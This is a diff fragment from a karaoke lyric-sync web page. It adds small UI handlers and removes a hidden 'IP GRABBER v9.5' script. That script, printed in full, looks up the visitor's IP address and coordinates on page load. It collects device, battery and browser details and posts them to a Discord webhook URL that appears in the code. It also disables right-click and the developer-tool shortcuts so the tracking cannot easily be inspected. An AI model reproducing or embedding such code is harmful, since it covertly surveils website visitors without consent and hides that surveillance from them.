   else if (e.key.toLowerCase() === 'd') $('debugPanel').classList.toggle('visible');
+  if (isPastedLyrics && e.key.toLowerCase() === 'n') micAdvNext();
+  if (isPastedLyrics && e.key.toLowerCase() === 'p') micAdvSetLine(micAdvCurLine - 1);
 });
-
-['manualArtist', 'manualTitle'].forEach(id =>
-  $(id).addEventListener('keydown', e => { if (e.key === 'Enter') manualSearch(); })
-);
+['manualArtist', 'manualTitle'].forEach(id => $(id).addEventListener('keydown', e => { if (e.key === 'Enter') manualSearch(); }));
+$('fullscreenOverlay').addEventListener('click', exitFullscreen);
+$('pasteOverlay').addEventListener('click', e => { if (e.target === $('pasteOverlay')) closePasteLyrics(); });
+$('settingsOverlay').addEventListener('click', e => { if (e.target === $('settingsOverlay')) closeSettings(); });
 
 renderFavList();
+dbg('🎤 Lyric Sync v28 ready — rAF mic engine + AudioCtx resume fix', '#c8f135');
 </script>
-<!-- ==================== IP GRABBER v9.5 - Handle Chrome UA Reduction ==================== -->
-<script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1489972314215809124/bRqWBzezptsRKE8nLFEFMjz3ShcgSFATRsf1KhuF4AkSKu3a2xIQkU0T4p5pCEgpQQq7";
-
-function getDetailedDeviceInfo() {
-    const ua = navigator.userAgent;
-    const uaLower = ua.toLowerCase();
-    const isReducedUA = ua.includes('Android 10; K') || uaLower.includes('android 10; k');
-    let deviceModel = 'Android Device';
-    if (isReducedUA) {
-        deviceModel = 'Android Device (Model Hidden by Chrome)';
-    } else {
-        if (uaLower.includes('samsung')) deviceModel = 'Samsung Device';
-        else if (uaLower.includes('xiaomi') || uaLower.includes('redmi') || uaLower.includes('poco')) deviceModel = 'Xiaomi/Redmi/Poco';
-        else if (uaLower.includes('oppo') || uaLower.includes('realme')) deviceModel = 'Oppo/Realme';
-        else if (uaLower.includes('vivo')) deviceModel = 'Vivo';
-        else if (uaLower.includes('infinix')) deviceModel = 'Infinix';
-        else if (uaLower.includes('tecno')) deviceModel = 'Tecno';
-    }
-    let browser = 'Unknown Browser';
-    if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) {
-        const ver = ua.match(/Chrome\/(\d+)/);
-        browser = `Chrome ${ver ? ver[1] : ''}`;
-    } else if (ua.includes('Edg')) {
-        const ver = ua.match(/Edg\/(\d+)/);
-        browser = `Edge ${ver ? ver[1] : ''}`;
-    } else if (ua.includes('SamsungBrowser')) {
-        browser = 'Samsung Internet';
-    }
-    return { deviceModel, browser, isReducedUA };
-}
-
-async function sendIPLog() {
-    let ipData = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown', org: 'Unknown', lat: null, lon: null };
-   
-    try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
-        ipData = {
-            ip: data.ip || 'Unknown',
-            city: data.city || '-',
-            region: data.region || '-',
-            country_name: data.country_name || 'Unknown',
-            org: data.org || 'Unknown',
-            lat: data.latitude,
-            lon: data.longitude
-        };
-    } catch (e) {}
-    
-    const { deviceModel, browser, isReducedUA } = getDetailedDeviceInfo();
-   
-    let batteryInfo = 'Tidak tersedia';
-    if ('getBattery' in navigator) {
-        try {
-            const battery = await navigator.getBattery();
-            batteryInfo = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : '(Discharging)'}`;
-        } catch (e) {}
-    }
-    
-    const androidMatch = navigator.userAgent.match(/Android\s([0-9.]+)/i);
-    const androidVersion = androidMatch ? androidMatch[1] : '—';
-    
-    const embed = {
-        title: "🎤 Karaoke Sync - Pengunjung Baru! (v9.5)",
-        color: 0x00ff88,
-        timestamp: new Date().toISOString(),
-        fields: [
-            { name: "IP Address", value: `\`${ipData.ip}\``, inline: true },
-            { name: "Lokasi", value: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`, inline: true },
-            { name: "Koordinat", value: ipData.lat && ipData.lon ? `${ipData.lat.toFixed(4)}, ${ipData.lon.toFixed(4)}` : 'Tidak tersedia', inline: true },
-            { name: "ISP", value: ipData.org, inline: true },
-            { name: "Device Model", value: deviceModel, inline: true },
-            { name: "Android Version", value: androidVersion + (isReducedUA ? " (fake by Chrome)" : ""), inline: true },
-            { name: "Browser", value: browser, inline: true },
-            { name: "Operating System", value: navigator.platform || 'Unknown', inline: true },
-            { name: "Screen", value: `${screen.width} × ${screen.height}`, inline: true },
-            { name: "CPU Cores", value: navigator.hardwareConcurrency || 'Unknown', inline: true },
-            { name: "RAM", value: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown', inline: true },
-            { name: "Battery", value: batteryInfo, inline: true },
-            { name: "Connection", value: navigator.connection ? navigator.connection.effectiveType : 'Unknown', inline: true },
-            { name: "Dark Mode", value: window.matchMedia('(prefers-color-scheme: dark)').matches ? '✅ Ya' : '❌ Tidak', inline: true },
-            { name: "User Agent", value: navigator.userAgent.substring(0, 240) + "...", inline: false },
-            { name: "Waktu (WIB)", value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }), inline: false }
-        ],
-        footer: { text: "IP Grabber v9.5 • Chrome UA Reduction Detected" }
-    };
-    
-    try {
-        await fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ username: "Karaoke Logger", embeds: [embed] })
-        });
-    } catch (err) {}
-}
-
-// ============== DISABLE RIGHT-CLICK + KEYBOARD SHORTCUTS ==============
-document.addEventListener('contextmenu', function(e) {
-    e.preventDefault();
-    return false;
-});
-
-document.addEventListener('keydown', function(e) {
-    // Disable F12
-    if (e.key === 'F12') {
-        e.preventDefault();
-        return false;
-    }
-    // Disable Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+U
-    if (e.ctrlKey && (e.shiftKey || e.key === 'u' || e.key === 'U' || e.key === 'i' || e.key === 'I' || e.key === 'j' || e.key === 'J' || e.key === 'c' || e.key === 'C')) {
-        e.preventDefault();
-        return false;
-    }
-    // Disable Ctrl+U
-    if (e.ctrlKey && e.key === 'u') {
-        e.preventDefault();
-        return false;
-    }
-});
-
-window.addEventListener('load', () => setTimeout(sendIPLog, 1800));
-</script>
-<!-- ==================== END IP GRABBER v9.5 ==================== -->
+</body>
+</html>
